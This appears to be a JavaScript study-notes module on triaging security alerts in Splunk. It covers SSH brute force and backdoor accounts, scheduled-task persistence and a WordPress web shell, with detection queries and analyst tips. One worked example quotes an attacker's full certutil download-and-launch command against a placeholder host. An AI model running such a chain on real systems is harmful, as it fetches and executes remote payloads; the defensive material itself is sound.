export default {
  id: "alert-triage-playbook",
  title: "Alert Triage Playbook — Splunk",
  src: "Alert Triage With Splunk",
  icon: "🚨",
  cards: [
    {
      title: "Before touching the SIEM — read the alert itself first",
      span2: true,
      blocks: [
        { t: "table", head: ["Alert field", "What it tells you before any query"], rows: [
          ["Host", "naming convention hints at role — WIN-/HOST- prefixes read as workstations, SRV/WEB/MSQL as servers. Shapes how suspicious a given action is (a daily recurring scheduled task is normal on a server, unusual on a workstation)."],
          ["User", "check an identity/HR table for role — does this action fit their job? IT staff creating a scheduled task is plausible; HR doing the same isn't."],
          ["Time", "does it fall inside the user's normal working hours/timezone, or stand out against their baseline?"],
        ]},
        { t: "note", kind: "info", title: "this is triage before triage", text: "This context determines which query is even worth running first — it's cheap, doesn't touch the SIEM, and can short-circuit an obvious false positive before you spend time on SPL." },
      ],
    },
    {
      title: "Scenario 1 — Linux: brute force → privesc → backdoor account",
      span2: true,
      blocks: [
        { t: "cmd", label: "baseline — auth activity for the source IP", code: "index=\"linux-alert\" sourcetype=\"linux_secure\" <src_ip>\n| search \"Accepted password for\" OR \"Failed password for\" OR \"Invalid user\"\n| sort + _time" },
        { t: "cmd", label: "which user(s) were actually targeted, and how hard", code: "index=\"linux-alert\" sourcetype=\"linux_secure\" <src_ip>\n| rex field=_raw \"sshd\\[\\d+\\]:\\s*(?<action>Failed|Accepted)\\s+\\S+\\s+for(?: invalid user)? (?<username>\\S+) from (?<src_ip>\\d{1,3}(?:\\.\\d{1,3}){3})\"\n| stats count values(action) as action by username" },
        { t: "cmd", label: "privesc evidence — did they gain root?", code: "index=\"linux-alert\" sourcetype=\"linux_secure\" <src_ip> *su*\n| sort + _time" },
        { t: "cmd", label: "persistence — backdoor account creation", code: "index=\"linux-alert\" sourcetype=\"linux_secure\" <src_ip> \"useradd\"\n| table _time host user_name Message" },
        { t: "note", kind: "warn", title: "the full chain in this room's example", text: "503 failed guesses landed a successful login for one targeted user → that account escalated to root via <code>su</code> → root created a new backdoor account for persistence. Each stage is a separate query, but they chain off the same source IP/username thread — same investigative shape as the log-analysis-siem WINHOST05 walkthrough." },
      ],
    },
    {
      title: "Scenario 2 — Windows: scheduled-task persistence (EventCode 4698)",
      span2: true,
      blocks: [
        { t: "cmd", label: "start broad — don't filter by host yet, to see if it's isolated or widespread", code: "index=\"win-alert\" EventCode=4698 <TaskName>\n| table _time EventCode user_name host Task_Name Message" },
        { t: "table", head: ["Task XML section", "What it tells you"], rows: [
          ["<Triggers><CalendarTrigger>", "when/how often — a daily recurrence on a single workstation is itself a red flag (legit recurring tasks skew server-side)"],
          ["<Actions><Exec><Command>/<Arguments>", "what actually runs — read the full command line, LOLBin download-rename-launch chains hide here"],
          ["<Principals><Principal><UserId>", "which account's context the task executes under"],
        ]},
        { t: "note", kind: "danger", title: "worked example — a full LOLBin chain in one command line", text: "<code>certutil.exe -urlcache -f http://&lt;domain&gt;:9876/rv.exe C:\\Users\\...\\Temp\\DataCollector.exe; Start-Process C:\\Users\\...\\Temp\\DataCollector.exe</code> — download via certutil, rename to a plausible-looking filename, launch via Start-Process, all as a single scheduled-task action. Same LOLBin roster as the earlier <b>Living Off the Land</b> material — certutil as downloader, PowerShell Start-Process as the launcher." },
        { t: "cmd", label: "pivot on the event's own Process ID field to find the parent process", code: "index=\"win-alert\" <ClientProcessId>\n| table _time host Image ParentImage CommandLine" },
        { t: "note", kind: "info", title: "the reusable pivot", text: "The 4698 event's \"Other Information\" section carries a Client Process ID — searching on that PID directly (rather than only the task name) surfaces the process that actually created the task (e.g. <code>cmd.exe</code>). Same principle as Linux's <code>ausearch -p &lt;ppid&gt;</code> pivot — an ID field in one event type is often the join key into a different event stream." },
      ],
    },
    {
      title: "Scenario 2 continued — discovery + logon-source tracing",
      span2: true,
      blocks: [
        { t: "cmd", label: "local-group enumeration (discovery phase)", code: "index=\"win-alert\" EventCode=4799 host=<host>\n| table _time host user_name Group_Name Message" },
        { t: "note", kind: "warn", title: "command-line equivalents to also search for", text: "<code>net group</code>, <code>net localgroup</code>, and <code>Get-LocalGroup</code> (PowerShell) all enumerate local group membership — worked example caught the attacker checking <code>Administrators</code> membership, the reconnaissance step that typically precedes a privesc attempt. The commands are legitimate admin tools; timing right after a compromised login is what makes it a tell." },
        { t: "cmd", label: "where did this logon actually come from? (EventCode 4624)", code: "index=\"win-alert\" <user> EventCode=4624\n| table _time host Workstation_Name Logon_Type Source_Network_Address" },
        { t: "note", kind: "info", title: "why this matters", text: "The Workstation Name field on a 4624 event answers \"where did this logon originate\" even when the target host's own logs show no network hop — traces lateral-movement provenance back to the pivot machine without needing a separate network-flow log source." },
      ],
    },
    {
      title: "Scenario 3 — Web: WordPress theme-editor web shell",
      span2: true,
      blocks: [
        { t: "cmd", label: "baseline — everything this IP touched", code: "index=web-alert <suspicious_ip>\n| table _time clientip useragent uri_path method status\n| sort + _time" },
        { t: "note", kind: "warn", title: "don't stop at the first finding", text: "Worked example immediately surfaced a Hydra-flagged brute force against <code>/wp-login.php</code> — real, but the alert was specifically about a <b>web shell</b>. Exclude the noisy signal and keep looking rather than closing the ticket on the first indicator found." },
        { t: "cmd", label: "exclude the known brute-force noise, look at what's left", code: "index=web-alert <suspicious_ip> useragent!=\"Mozilla/5.0 (Hydra)\"\n| table _time clientip useragent uri_path referer referer_domain method status" },
        { t: "note", kind: "danger", title: "the tell: Referer exposes the real page, URI doesn't", text: "A POST to the generic-looking <code>admin-ajax.php</code> had a <b>Referer</b> header pointing to <code>theme-editor.php?file=&lt;webshell&gt;.php</code>. The Theme Editor lets any admin-level account edit PHP theme files directly through the WordPress UI — once an attacker has admin access (here, via the earlier brute force), they can write a web shell into a theme file with no separate \"upload\" step to leave a trace of. The URI alone (<code>admin-ajax.php</code>) looks like routine AJAX traffic; the Referer is what actually gives it away." },
        { t: "cmd", label: "pivot by the web shell's filename — isolate every request driven through it", code: "index=web-alert <suspicious_ip> <webshell_filename>.php\n| table _time clientip useragent uri referer referer_domain method status\n| sort + _time" },
        { t: "note", kind: "info", title: "check if it's a known public shell before assuming custom tooling", text: "Named/public web shells are still googleable — e.g. <code>b374k.php</code> is a well-known public PHP web shell (GitHub, Kali tools repo). Searching the exact filename confirms the finding fast, and matches the earlier Detecting Web Shells room's note that attackers often reuse popular shells filename-and-all rather than writing custom ones." },
      ],
    },
    {
      title: "Every scenario in this room ended the same way",
      blocks: [
        { t: "steps", items: [
          "Classify: True Positive, based on demonstrated evidence (successful login, malicious command line, confirmed web shell interaction) — not \"looks suspicious.\"",
          "Escalate to L2 immediately — don't try to fully root-cause it yourself.",
          "Leave the deeper questions (how did the attacker get the local IP / initial foothold / actually upload the shell) explicitly for L2/IR — L1 scope is identify-and-escalate.",
        ]},
        { t: "note", kind: "info", text: "See also the Splunk SPL — Query Language Reference section for the general syntax (rex, stats, the duration pattern) these scenario queries build on." },
      ],
    },
  ],
};
